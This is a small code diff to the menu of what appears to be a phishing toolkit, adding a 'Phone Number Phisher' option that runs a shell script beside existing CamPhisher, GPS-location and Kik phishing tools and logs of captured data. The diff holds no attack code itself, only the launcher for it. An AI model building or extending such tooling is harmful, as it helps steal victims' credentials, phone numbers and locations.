@@ -5,6 +5,7 @@ def main():
     print("1. CamPhisher")
     print("2. GPS PIN POINTER")
     print("3. Kik Phisher")
+    print("4. Phone Number Phisher")
     print("-------------------")
     print("99. gps logs")
     print("100. Kik Phisher Saved Info")
@@ -21,6 +22,8 @@ def main():
 
         elif choice == '3':
             os.system("bash tools/phishers/kikphish.sh")
+        elif choice == '4':
+            os.system("bash tools/phishers/phonenumber_phisher.sh")
 
         elif choice == '99':
             os.system("pico tools/phishers/logs.txt")
